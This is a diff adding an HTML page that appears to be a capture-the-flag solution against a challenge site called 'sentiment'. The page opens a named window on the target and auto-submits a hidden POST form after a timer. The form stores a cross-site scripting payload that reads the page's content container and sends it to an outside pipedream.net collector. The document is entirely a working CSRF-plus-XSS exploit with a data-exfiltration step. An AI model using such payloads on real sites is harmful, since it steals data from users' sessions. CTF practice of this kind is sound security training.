@@ -1,0 +1,15 @@
+<script>
+	window.open("https://sentiment.chall.pwnoh.io/", "lmao");
+	window.open("/solve2.html");
+</script>
+<form action="https://sentiment.chall.pwnoh.io/edit" method="POST">
+	<input
+		name="content"
+		value="<script>window.open('','lmao').document.body.innerHTML+=`<img src=a onerror='document.body.innerHTML=\`<img src=https://en4tp808ynm2k.x.pipedream.net/\`+document.querySelector(\`.content>.container\`).textContent+\`>\`'>`</script>"
+	/>
+</form>
+<script>
+	setTimeout(() => {
+		document.forms[0].submit();
+	}, 3000);
+</script>
